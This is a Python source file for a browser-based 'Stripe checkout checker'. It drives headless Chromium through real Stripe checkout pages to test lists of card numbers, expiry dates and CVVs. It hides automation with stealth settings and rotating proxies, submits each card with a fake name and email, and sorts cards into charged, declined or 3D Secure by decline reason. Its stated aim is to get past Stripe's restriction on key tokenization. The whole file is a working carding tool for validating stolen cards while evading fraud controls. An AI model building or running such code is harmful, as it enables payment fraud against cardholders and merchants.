"""
Browser-based Stripe Checkout Checker
Uses Playwright to handle sites with "Restrict publishable key tokenization" enabled.
This is a fallback for sites that require Stripe Elements (browser-based).
Note: ~10x slower than API-based checking but supports ALL Stripe checkout URLs.
"""
import asyncio
import time
import re
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

async def browser_charge_card(checkout_url: str, card: dict, proxy_str: str | None = None, timeout: int = 60) -> dict:
    """
    Use a real browser to fill Stripe checkout form.
    Works on ALL Stripe checkout URLs including restricted ones.
    
    Args:
        checkout_url: Full Stripe checkout URL
        card: Dict with cc, month, year, cvv keys
        proxy_str: Optional proxy in format host:port:user:pass
        timeout: Max seconds to wait (default 60)
    
    Returns:
        Dict with status, response, time, etc.
    """
    start = time.perf_counter()
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "method": "browser",
        "time": 0
    }
    
    browser = None
    
    try:
        # Check for stealth availability but don't fail if missing
        try:
            from playwright_stealth import stealth_async
            STEALTH_AVAILABLE = True
        except ImportError:
            STEALTH_AVAILABLE = False

        async with async_playwright() as p:
            import shutil
            chromium_path = shutil.which("chromium") or shutil.which("chromium-browser") or shutil.which("google-chrome")
            if not chromium_path:
                raise RuntimeError("Chromium not found in PATH")

            launch_args = {
                "headless": True,
                "executable_path": chromium_path,
                "args": [
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-gpu",
                    "--disable-software-rasterizer",
                    "--no-zygote",
                    "--single-process",
                    "--disable-extensions",
                    "--disable-blink-features=AutomationControlled",
                ]
            }

            if proxy_str:
                parsed = parse_proxy(proxy_str)
                if parsed:
                    launch_args["proxy"] = parsed

            browser = await p.chromium.launch(**launch_args)
            context = await browser.new_context(
                viewport={"width": 1280, "height": 720},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
            )
            
            page = await context.new_page()
            if STEALTH_AVAILABLE:
                await stealth_async(page)
            
            print(f"[BROWSER] Navigating to checkout...")
            await page.goto(checkout_url, wait_until="domcontentloaded", timeout=45000)
            await asyncio.sleep(3)
            
            # Additional wait for network to settle slightly, but don't hang
            try:
                await page.wait_for_load_state("networkidle", timeout=10000)
            except:
                print("[BROWSER] Network idle timeout, proceeding anyway...")
            
            page_content = await page.content()
            
            # Debug log to see why it thinks it's expired
            print(f"[BROWSER] Page Title: {await page.title()}")
            
            # Improved expiry detection
            is_expired = False
            expired_keywords = ["expired", "no longer available", "session has expired", "link is no longer valid"]
            
            # Check for standard Stripe expiry message which usually has its own container
            # Added more specific data-testids for modern Stripe
            expiry_el = page.locator(".StripeElement-expired, .expired-message, .SessionExpired, [data-testid=\"hosted-payment-session-expired\"], [data-testid=\"error-container\"]").first
            if await expiry_el.count() > 0:
                # Double check the text inside the error container isn't just a recoverable error
                error_text = (await expiry_el.inner_text()).lower()
                if any(kw in error_text for kw in expired_keywords) or "available" in error_text:
                    is_expired = True
            
            if not is_expired:
                # Check text content carefully - avoid false positives in body text
                # We look at the top level text which is usually where the big "This session has expired" message lives
                body_text = await page.inner_text("body")
                body_text_lower = body_text.lower()
                
                # Stripe pages usually have "Stripe" in the footer or title
                is_stripe_page = "stripe" in body_text_lower or "checkout" in (await page.title()).lower()
                
                for kw in expired_keywords:
                    if kw in body_text_lower:
                        # A real expiry page is usually short or lacks the checkout form
                        inputs_count = await page.locator("input").count()
                        if inputs_count < 2 and is_stripe_page:
                            is_expired = True
                            break
            
            # Final check: If we don't see ANY input fields or buttons, it's not a checkout page
            if not is_expired:
                inputs = await page.locator("input").count()
                if inputs < 2: # At minimum should have Card Number and Email/Name or Expiry/CVC
                    # Wait a bit more in case it's just slow
                    await asyncio.sleep(2)
                    inputs = await page.locator("input").count()
                    if inputs < 2:
                        print("[BROWSER] No inputs found after delay, likely invalid/expired page")
                        is_expired = True
            
            if is_expired:
                # One last check: if we see "checkout" in the URL and an email field, it's NOT expired
                try:
                    email_exists = await page.locator('input[name="email"], input[type="email"]').count() > 0
                    if "checkout.stripe.com" in page.url and email_exists:
                        print("[BROWSER] False positive expiry detected, proceeding...")
                        is_expired = False
                except:
                    pass

            if is_expired:
                result["status"] = "ERROR"
                result["response"] = "Checkout session expired"
                return result
            
            print(f"[BROWSER] Filling card details...")
            
            card_filled = await fill_stripe_elements(page, card)
            if not card_filled:
                result["status"] = "ERROR"
                result["response"] = "Could not find card input fields"
                return result
            
            email_input = page.locator('input[name="email"], input[type="email"]').first
            if await email_input.count() > 0:
                await email_input.fill("john.smith@example.com")
                await asyncio.sleep(0.3)
            
            name_input = page.locator('input[name="name"], input[name="billingName"]').first
            if await name_input.count() > 0:
                await name_input.fill("John Smith")
                await asyncio.sleep(0.3)
            
            print(f"[BROWSER] Submitting payment...")
            submit_btn = page.locator('button[type="submit"], .SubmitButton, [data-testid="hosted-payment-submit-button"]').first
            if await submit_btn.count() > 0:
                await submit_btn.click()
            else:
                await page.keyboard.press("Enter")
            
            response_text = await wait_for_response(page, timeout=45)
            
            # Try to get the real error from the UI
            try:
                # Common Stripe error selectors including specific ones for decline codes
                error_container = page.locator('.FieldError, .Error, [class*="error"], [class*="decline"], #error-message, .StripeElement-errorMessage, .Error-message, [data-testid="error-message"]').first
                if await error_container.count() > 0:
                    real_error = await error_container.text_content()
                    if real_error and len(real_error.strip()) > 3:
                        ui_error = real_error.strip()
                        print(f"[BROWSER] Captured real error from UI: {ui_error}")
                        
                        # Store detailed decline reason if found
                        if any(kw in ui_error.lower() for kw in ["fraud", "risk", "security", "high risk"]):
                            result["decline_reason"] = "FRAUDULENT"
                        elif "insufficient" in ui_error.lower():
                            result["decline_reason"] = "INSUFFICIENT_FUNDS"
                        elif "cvc" in ui_error.lower() or "security code" in ui_error.lower():
                            result["decline_reason"] = "INCORRECT_CVC"
                        else:
                            result["decline_reason"] = "GENERIC_DECLINE"
                            
                        if response_text != "3D_SECURE":
                            response_text = ui_error
            except:
                pass
            
            result["status"], result["response"] = parse_response(response_text, page_content)
            # Ensure the captured UI error is preserved in the final result object
            if response_text and response_text not in ["SUCCESS", "SUCCESS_REDIRECT", "3D_SECURE", "TIMEOUT", "FAILED_REDIRECT"]:
                result["secondary_response"] = response_text
            
    except PlaywrightTimeout:
        result["status"] = "ERROR"
        result["response"] = "Browser timeout - page took too long to load"
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = f"Browser error: {str(e)[:80]}"
    finally:
        if browser:
            await browser.close()
        result["time"] = round(time.perf_counter() - start, 2)
        print(f"[BROWSER] Result: {result['status']} - {result['response']} ({result['time']}s)")
    
    return result


async def fill_stripe_elements(page, card: dict) -> bool:
    """Fill card details in Stripe Elements iframe."""
    try:
        await asyncio.sleep(1)
        
        card_number_selectors = [
            'input[name="cardNumber"]',
            'input[name="cardnumber"]',
            'input[data-elements-stable-field-name="cardNumber"]',
            'input[autocomplete="cc-number"]',
            '#cardNumber',
            '.CardNumberField input'
        ]
        
        card_input = None
        for selector in card_number_selectors:
            try:
                el = page.locator(selector).first
                if await el.count() > 0:
                    card_input = el
                    break
            except:
                pass
        
        if card_input:
            await card_input.click()
            await card_input.fill(card['cc'])
            await asyncio.sleep(0.3)
            
            exp_input = page.locator('input[name="cardExpiry"], input[name="exp-date"], input[autocomplete="cc-exp"]').first
            if await exp_input.count() > 0:
                exp_value = f"{card['month']}{card['year'][-2:]}"
                await exp_input.fill(exp_value)
                await asyncio.sleep(0.3)
            
            cvc_input = page.locator('input[name="cardCvc"], input[name="cvc"], input[autocomplete="cc-csc"]').first
            if await cvc_input.count() > 0:
                await cvc_input.fill(card['cvv'])
                await asyncio.sleep(0.3)
            
            return True
        
        iframes = page.frame_locator('iframe[name*="__privateStripeFrame"], iframe[src*="stripe.com/elements"]')
        
        iframe_selectors = [
            ('iframe[name*="cardNumber"]', 'input'),
            ('iframe[name*="__privateStripeFrame"]', 'input[name="cardnumber"]'),
        ]
        
        for iframe_sel, input_sel in iframe_selectors:
            try:
                iframe = page.frame_locator(iframe_sel).first
                card_el = iframe.locator(input_sel).first
                
                if await page.locator(iframe_sel).count() > 0:
                    await card_el.fill(card['cc'])
                    await asyncio.sleep(0.5)
                    
                    exp_iframe = page.frame_locator('iframe[name*="cardExpiry"]').first
                    exp_el = exp_iframe.locator('input').first
                    if await page.locator('iframe[name*="cardExpiry"]').count() > 0:
                        await exp_el.fill(f"{card['month']}{card['year'][-2:]}")
                        await asyncio.sleep(0.3)
                    
                    cvc_iframe = page.frame_locator('iframe[name*="cardCvc"]').first
                    cvc_el = cvc_iframe.locator('input').first
                    if await page.locator('iframe[name*="cardCvc"]').count() > 0:
                        await cvc_el.fill(card['cvv'])
                        await asyncio.sleep(0.3)
                    
                    return True
            except:
                continue
        
        print("[BROWSER] Trying keyboard input method...")
        await page.keyboard.type(card['cc'], delay=50)
        await page.keyboard.press("Tab")
        await asyncio.sleep(0.2)
        await page.keyboard.type(f"{card['month']}{card['year'][-2:]}", delay=50)
        await page.keyboard.press("Tab")
        await asyncio.sleep(0.2)
        await page.keyboard.type(card['cvv'], delay=50)
        
        return True
        
    except Exception as e:
        print(f"[BROWSER] Fill error: {e}")
        return False


async def wait_for_response(page, timeout: int = 30) -> str:
    """Wait for payment response after submission."""
    start = time.time()
    last_content = ""
    
    while time.time() - start < timeout:
        await asyncio.sleep(1)
        
        try:
            current_url = page.url
            if "success" in current_url.lower() or "thank" in current_url.lower() or "complete" in current_url.lower():
                return "SUCCESS_REDIRECT"
            if "cancel" in current_url.lower() or "failed" in current_url.lower():
                return "FAILED_REDIRECT"
        except:
            pass
        
        try:
            content = await page.content()
            
            error_el = page.locator('.FieldError, .Error, [class*="error"], [class*="decline"]').first
            if await error_el.count() > 0:
                error_text = await error_el.text_content()
                if error_text and error_text.strip():
                    return error_text.strip()
            
            if "your card was declined" in content.lower():
                return "Your card was declined"
            if "insufficient funds" in content.lower():
                return "Insufficient funds"
            if "incorrect cvc" in content.lower() or "security code" in content.lower():
                return "Incorrect CVC"
            if "expired" in content.lower() and "card" in content.lower():
                return "Card expired"
            if "3d secure" in content.lower() or "authentication" in content.lower():
                return "3D_SECURE"
            if "thank you" in content.lower() or "success" in content.lower() or "payment complete" in content.lower():
                return "SUCCESS"
            
            last_content = content
        except:
            pass
    
    return "TIMEOUT"


def parse_response(response_text: str, page_content: str = "") -> tuple:
    """Parse response text into status and message."""
    response_lower = response_text.lower()
    
    if response_text in ["SUCCESS", "SUCCESS_REDIRECT"]:
        return "CHARGED", "Payment successful"
    
    if response_text == "3D_SECURE":
        return "3DS", "3D Secure Required"
    
    if response_text in ["TIMEOUT", "FAILED_REDIRECT"]:
        return "ERROR", "Payment processing timeout"
    
    if "declined" in response_lower:
        return "DECLINED", response_text
    
    if "insufficient" in response_lower:
        return "DECLINED", "Insufficient funds"
    
    if "cvc" in response_lower or "cvv" in response_lower or "security code" in response_lower:
        return "DECLINED", "Incorrect CVC"
    
    if "expired" in response_lower:
        return "DECLINED", "Card expired"
    
    if "fraud" in response_lower or "risk" in response_lower:
        return "DECLINED", "High risk transaction blocked"
    
    if "card number" in response_lower and ("invalid" in response_lower or "incorrect" in response_lower):
        return "DECLINED", "Invalid card number"
    
    return "DECLINED", response_text if response_text else "Unknown response"


def parse_proxy(proxy_str: str) -> dict:
    """Parse proxy string to Playwright format."""
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    
    try:
        if '@' in proxy_str:
            auth_part, host_part = proxy_str.rsplit('@', 1)
            if ':' in auth_part and ':' in host_part:
                user, password = auth_part.split(':', 1)
                host, port = host_part.rsplit(':', 1)
                return {
                    "server": f"http://{host}:{port}",
                    "username": user,
                    "password": password
                }
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                return {
                    "server": f"http://{parts[0]}:{parts[1]}",
                    "username": parts[2],
                    "password": parts[3]
                }
            elif len(parts) == 2:
                return {
                    "server": f"http://{parts[0]}:{parts[1]}"
                }
    except:
        pass
    
    return None


async def test_browser_checker():
    """Quick test of browser checker."""
    test_card = {
        "cc": "4242424242424242",
        "month": "12",
        "year": "2028",
        "cvv": "123"
    }
    
    print("Browser checker loaded successfully.")
    print("Use browser_charge_card(url, card, proxy) to check restricted Stripe checkouts.")


if __name__ == "__main__":
    asyncio.run(test_browser_checker())
